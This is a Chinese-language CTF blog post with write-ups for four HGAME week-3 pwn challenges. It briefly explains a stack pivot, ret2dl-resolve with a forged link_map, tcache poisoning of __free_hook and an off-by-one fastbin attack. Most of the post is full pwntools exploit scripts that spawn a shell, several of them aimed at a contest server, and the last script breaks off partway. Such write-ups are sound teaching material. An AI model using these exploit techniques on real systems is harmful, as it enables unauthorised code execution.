<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>HGAME-WEEK3-WP - blog of chuj</title><link rel=icon type=image/png href=https://www.cjovi.icu/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="pwn blackgive 栈迁移，不要想复杂了 exp #!/usr/bin/env python # coding=utf-8 from pwn import * context(log_level = 'debug') context.terminal = ['tmux','splitw','-h'] sh = process(&#34;./blackgive&#34;) #sh = remote(&#34;&#34;) libc = ELF(&#34;./libc6_2.27-3ubuntu1.4_amd64.so&#34;) elf = ELF(&#34;./blackgive&#34;) pop_rdi_ret = 0x400813 bss_base = 0x6010A0 off = 0xA0 payload = 'paSsw0rd'.ljust(0x20,'\x00') payload += p64(bss_base + off - 0x8) + p64(0x4007A3) sh.recvuntil(&#34;password:&#34;) #gdb.attach(proc.pidof(sh)[0]) sh.send(payload) payload = '\x00' * off + p64(pop_rdi_ret)"><meta property="og:image" content><meta property="og:title" content="HGAME-WEEK3-WP"><meta property="og:description" content="pwn blackgive 栈迁移，不要想复杂了 exp #!/usr/bin/env python # coding=utf-8 from pwn import * context(log_level = 'debug') context.terminal = ['tmux','splitw','-h'] sh = process(&#34;./blackgive&#34;) #sh = remote(&#34;&#34;) libc = ELF(&#34;./libc6_2.27-3ubuntu1.4_amd64.so&#34;) elf = ELF(&#34;./blackgive&#34;) pop_rdi_ret = 0x400813 bss_base = 0x6010A0 off = 0xA0 payload = 'paSsw0rd'.ljust(0x20,'\x00') payload += p64(bss_base + off - 0x8) + p64(0x4007A3) sh.recvuntil(&#34;password:&#34;) #gdb.attach(proc.pidof(sh)[0]) sh.send(payload) payload = '\x00' * off + p64(pop_rdi_ret)"><meta property="og:type" content="article"><meta property="og:url" content="https://www.cjovi.icu/wp/1100.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-02-21T20:00:00+00:00"><meta property="article:modified_time" content="2021-02-21T20:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="HGAME-WEEK3-WP"><meta name=twitter:description content="pwn blackgive 栈迁移，不要想复杂了 exp #!/usr/bin/env python # coding=utf-8 from pwn import * context(log_level = 'debug') context.terminal = ['tmux','splitw','-h'] sh = process(&#34;./blackgive&#34;) #sh = remote(&#34;&#34;) libc = ELF(&#34;./libc6_2.27-3ubuntu1.4_amd64.so&#34;) elf = ELF(&#34;./blackgive&#34;) pop_rdi_ret = 0x400813 bss_base = 0x6010A0 off = 0xA0 payload = 'paSsw0rd'.ljust(0x20,'\x00') payload += p64(bss_base + off - 0x8) + p64(0x4007A3) sh.recvuntil(&#34;password:&#34;) #gdb.attach(proc.pidof(sh)[0]) sh.send(payload) payload = '\x00' * off + p64(pop_rdi_ret)"><script src=https://www.cjovi.icu/js/feather.min.js></script>
<link href=https://www.cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://www.cjovi.icu/css/main.858703d01d3c45e6b3e5964f9788e10759b7deb2158ea92653787f83364a9899.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://www.cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://www.cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
<a href=/posts.html>All posts</a>
<a href=/about.html>About</a>
<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>HGAME-WEEK3-WP</h1><div class=meta>Posted on Feb 21, 2021</div></div><section class=body><h2 id=pwn>pwn</h2><h3 id=blackgive>blackgive</h3><p>栈迁移，不要想复杂了</p><h4 id=exp>exp</h4><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span>context(log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>)
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#39;tmux&#39;</span>,<span style=color:#4070a0>&#39;splitw&#39;</span>,<span style=color:#4070a0>&#39;-h&#39;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> process(<span style=color:#4070a0>&#34;./blackgive&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = remote(&#34;&#34;)</span>
</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc6_2.27-3ubuntu1.4_amd64.so&#34;</span>)
</span></span><span style=display:flex><span>elf <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./blackgive&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#666>=</span> <span style=color:#40a070>0x400813</span>
</span></span><span style=display:flex><span>bss_base <span style=color:#666>=</span> <span style=color:#40a070>0x6010A0</span>
</span></span><span style=display:flex><span>off <span style=color:#666>=</span> <span style=color:#40a070>0xA0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;paSsw0rd&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x20</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(bss_base <span style=color:#666>+</span> off <span style=color:#666>-</span> <span style=color:#40a070>0x8</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x4007A3</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;password:&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>send(payload)
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> off <span style=color:#666>+</span> p64(pop_rdi_ret) <span style=color:#666>+</span> p64(elf<span style=color:#666>.</span>got[<span style=color:#4070a0>&#39;puts&#39;</span>]) <span style=color:#666>+</span> p64(elf<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#39;puts&#39;</span>]) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x40070a</span>) 
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;!</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>puts_addr <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>))
</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> puts_addr <span style=color:#666>-</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#39;puts&#39;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;paSsw0rd&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x20</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x4f432</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;password:&#34;</span>,payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><h3 id=without_leak>without_leak</h3><p>64 位 <code>ret2dl-resolve</code> 裸题。由于输出流都被关闭，所以无法实现 leak，考虑进行 <code>ret2dl-resolve</code>。由于提供了 <code>libc</code>，考虑通过伪造 <code>link_map</code> 结构体 getshell。打本地的时候，即便打通了也会有</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/3374585519.png></div><p>这个 <code>Got EOF</code>，一般这个时候就是说明失败了，而且用 <code>exec 1>&amp;0</code> 也无用，导致我浪费了很多时间调试。最后终于想到用 <code>mkdir</code> 测试一下才知道成功 getshell 了。</p><p>关于调试，由于我们的伪造，<code>sym->st_other</code> 是指向 <code>read@got - 8</code> 的，也就是 <code>close@got</code>，要保证 <code>close</code> 被解析过才能正常运行，否则会崩溃。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#39;tmux&#39;</span>,<span style=color:#4070a0>&#39;splitw&#39;</span>,<span style=color:#4070a0>&#39;-h&#39;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./without_leak&#34;)</span>
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;182.92.108.71&#34;</span>,<span style=color:#40a070>30483</span>)
</span></span><span style=display:flex><span>elf <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./without_leak&#34;</span>)
</span></span><span style=display:flex><span>bss_addr <span style=color:#666>=</span> <span style=color:#40a070>0x404B00</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>ret2csu_payload</span>(rbx,rbp,call_addr,argv1,argv2,argv3):
</span></span><span style=display:flex><span>    csu1 <span style=color:#666>=</span> <span style=color:#40a070>0x40123A</span>
</span></span><span style=display:flex><span>    csu2 <span style=color:#666>=</span> <span style=color:#40a070>0x401220</span>
</span></span><span style=display:flex><span>    payload <span style=color:#666>=</span> p64(csu1)
</span></span><span style=display:flex><span>    payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>1</span>) <span style=color:#666>+</span> p64(argv1) <span style=color:#666>+</span> p64(argv2) <span style=color:#666>+</span> p64(argv3) <span style=color:#666>+</span> p64(call_addr)
</span></span><span style=display:flex><span>    payload <span style=color:#666>+=</span> p64(csu2)
</span></span><span style=display:flex><span>    payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>*</span> <span style=color:#40a070>7</span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> payload
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>fake_Linkmap_payload</span>(elf,fake_linkmap_addr,known_func_ptr,offset):
</span></span><span style=display:flex><span>    plt0 <span style=color:#666>=</span> elf<span style=color:#666>.</span>get_section_by_name(<span style=color:#4070a0>&#39;.plt&#39;</span>)<span style=color:#666>.</span>header<span style=color:#666>.</span>sh_addr
</span></span><span style=display:flex><span>    linkmap <span style=color:#666>=</span> p64(offset <span style=color:#666>&amp;</span> (<span style=color:#40a070>2</span> <span style=color:#666>**</span> <span style=color:#40a070>64</span> <span style=color:#666>-</span> <span style=color:#40a070>1</span>))<span style=color:#60a0b0;font-style:italic>#l_addr</span>
</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> p64(<span style=color:#40a070>17</span>)<span style=color:#60a0b0;font-style:italic>#l_name</span>
</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> p64(fake_linkmap_addr <span style=color:#666>+</span> <span style=color:#40a070>0x18</span>)<span style=color:#60a0b0;font-style:italic>#l_ld</span>
</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> p64((fake_linkmap_addr <span style=color:#666>+</span> <span style=color:#40a070>0x30</span> <span style=color:#666>-</span> offset) <span style=color:#666>&amp;</span> (<span style=color:#40a070>2</span> <span style=color:#666>**</span> <span style=color:#40a070>64</span> <span style=color:#666>-</span> <span style=color:#40a070>1</span>))<span style=color:#60a0b0;font-style:italic>#l_next</span>
</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> p64(<span style=color:#40a070>7</span>)<span style=color:#60a0b0;font-style:italic>#l_prev</span>
</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)<span style=color:#60a0b0;font-style:italic>#l_real</span>
</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)<span style=color:#60a0b0;font-style:italic>#l_ns</span>
</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> p64(<span style=color:#40a070>6</span>)<span style=color:#60a0b0;font-style:italic>#l_libname</span>
</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> p64(known_func_ptr <span style=color:#666>-</span> <span style=color:#40a070>8</span>)<span style=color:#60a0b0;font-style:italic>#l_info[0] tags</span>
</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>
</span></span><span style=display:flex><span>    linkmap <span style=color:#666>=</span> linkmap<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x68</span>,<span style=color:#4070a0>&#39;A&#39;</span>)
</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> p64(fake_linkmap_addr)
</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> p64(fake_linkmap_addr <span style=color:#666>+</span> <span style=color:#40a070>0x38</span>)
</span></span><span style=display:flex><span>    linkmap <span style=color:#666>=</span> linkmap<span style=color:#666>.</span>ljust(<span style=color:#40a070>0xf8</span>,<span style=color:#4070a0>&#39;A&#39;</span>)
</span></span><span style=display:flex><span>    linkmap <span style=color:#666>+=</span> p64(fake_linkmap_addr <span style=color:#666>+</span> <span style=color:#40a070>8</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    resolve_call <span style=color:#666>=</span> p64(plt0 <span style=color:#666>+</span> <span style=color:#40a070>6</span>) <span style=color:#666>+</span> p64(fake_linkmap_addr) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> (linkmap,resolve_call)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>offset <span style=color:#666>=</span> <span style=color:#40a070>0x20</span> <span style=color:#666>+</span> <span style=color:#40a070>0x8</span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> offset
</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc-2.27.so&#34;</span>)
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#39;system offset:&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#39;system&#39;</span>]))
</span></span><span style=display:flex><span>fake_linkmap_addr <span style=color:#666>=</span> bss_addr <span style=color:#666>+</span> <span style=color:#40a070>0x100</span>
</span></span><span style=display:flex><span>linkmap, resolve_call <span style=color:#666>=</span> fake_Linkmap_payload(elf,fake_linkmap_addr,elf<span style=color:#666>.</span>got[<span style=color:#4070a0>&#39;read&#39;</span>],libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#39;system&#39;</span>] <span style=color:#666>-</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#39;read&#39;</span>])
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> ret2csu_payload(<span style=color:#40a070>0</span>,<span style=color:#40a070>1</span>,elf<span style=color:#666>.</span>got[<span style=color:#4070a0>&#39;read&#39;</span>],<span style=color:#40a070>0</span>,fake_linkmap_addr,<span style=color:#007020>len</span>(linkmap))
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x401156</span>)
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh.sendafter(&#39;input&gt; \n&#39;,rop.chain().ljust(0x200,&#39;a&#39;))</span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;input&gt; </span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>send(payload<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x200</span>,<span style=color:#4070a0>&#39;a&#39;</span>))
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>send(linkmap)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> offset
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x40101a</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x401243</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(fake_linkmap_addr <span style=color:#666>+</span> <span style=color:#40a070>0x48</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> resolve_call
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>send(payload<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x200</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><h3 id=todolist>todolist</h3><p>这道题就不说了，和上周的题是几乎一样的</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span>context(log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./todolist&#34;)</span>
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;182.92.108.71&#34;</span>,<span style=color:#40a070>30411</span>)
</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc-2.27.so&#34;</span>) 
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>take</span>(size):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;write?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(size))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>delete</span>(index):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;delete?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(index))
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>edit</span>(payload,index):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;3&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;edit?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(index))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;write?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(<span style=color:#007020>len</span>(payload)))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>send(payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>show</span>(index):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;exit</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39;4&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;check?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#007020>str</span>(index))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>take(<span style=color:#40a070>2048</span>)<span style=color:#60a0b0;font-style:italic>#index:0</span>
</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x100</span>)<span style=color:#60a0b0;font-style:italic>#index:1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>delete(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>show(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> <span style=color:#40a070>0x3ebc40</span> <span style=color:#666>-</span> <span style=color:#40a070>96</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
</span></span><span style=display:flex><span>delete(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#malloc_hook = libc_base + libc.symbols[&#34;__malloc_hook&#34;]</span>
</span></span><span style=display:flex><span>free_hook <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__free_hook&#34;</span>]
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#log.success(&#34;malloc_hook:&#34; + hex(malloc_hook)) </span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#edit(p64(malloc_hook - 0x10),1)</span>
</span></span><span style=display:flex><span>edit(p64(free_hook),<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x100</span>)<span style=color:#60a0b0;font-style:italic>#index:2</span>
</span></span><span style=display:flex><span>take(<span style=color:#40a070>0x100</span>)<span style=color:#60a0b0;font-style:italic>#index:3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>one_gadget <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x4f432</span>
</span></span><span style=display:flex><span>realloc <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__libc_realloc&#34;</span>]
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#payload = p64(one_gadget) + p64(realloc + 0xa)</span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> p64(one_gadget)
</span></span><span style=display:flex><span>edit(payload,<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#take(0x200)</span>
</span></span><span style=display:flex><span>delete(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><p>看完之后就觉得这题可以用上周的 exp 来打，所以就 <code>cp</code> 了一下上周的，但是没看清所处的目录，一个 tab 一个回车之后我 blackgive 的 exp 就没了。</p><h3 id=library-management-system>Library management System</h3><p><code>off by one</code></p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/338423648.png></div><p>这个读入函数是会多读一个字节的，所以我们利用他来修改下一个 chunk 的 size 域。做法就是先申请4个 chunk，记作A，B，C，D。由于本题没有修改的功能，所以需要先 <code>free</code> A，再<code>alloc</code> A，通过对 A <code>off by one</code> 修改 chunk B 的 <code>size</code> 域，使 chunk B 的 <code>size</code>为 B 和 C 的和（这是为了在<code>free</code>的时候通过检测。同时这个和需要大于0x80，这样<code>free</code>的时候才会进<code>Unsorted Bin</code>）实现 <code>chunk overlapping</code>，然后 <code>free</code>掉 B，再把 B 申请回来就可以通过<code>show</code>的功能 leak 出 libc。然后再来一轮，这次先<code>free</code>掉 C，再对 B<code>chunk overlapping</code>，修改 C 的 fd，使之指向 <code>&__malloc_hook - 0x23</code>。指向这个奇怪地址的原因是因为 <code>fastbin</code> 会对目标 chunk 的 <code>size</code> 做检测</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/240291959.png></div><p>可见 <code>malloc</code> 附近并没有可以作为 <code>size</code> 。好在 <code>fastbin</code> 并不会对地址对齐做检测，所以我们通过字节错位来伪造出 <code>size</code>，也就是 从<code>&__malloc_hook - 0x23</code> 开始的这个 chunk 了。</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/02/4254668762.png></div><p>就是这样一个效果，我们就可以实现 <code>arbitrary alloc</code> 了。</p><h4 id=exp-1>exp</h4><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>#!/usr/bin/env python
</span></span><span style=display:flex><span># coding=utf-8
</span></span><span style=display:flex><span>from pwn import *
</span></span><span style=display:flex><span>context(log_level = &#39;debug&#39;)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>#sh = process(&#34;./library&#34;)
</span></span><span style=display:flex><span>sh = remote(&#34;182.92.108.71&#34;,30431)
</span></span><span style=display:flex><span>libc = ELF(&#34;./libc.so.6&#34;)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>def Add(size,payload):
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;choice: &#34;,str(1))
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;title: &#34;,str(size))
</span></span><span style=display:flex><span>    sh.sendafter(&#34;title: &#34;,payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>def Delete(index):
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;choice: &#34;,str(2))
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;id: &#34;,str(index))
</span></span><span style=display:flex><span>
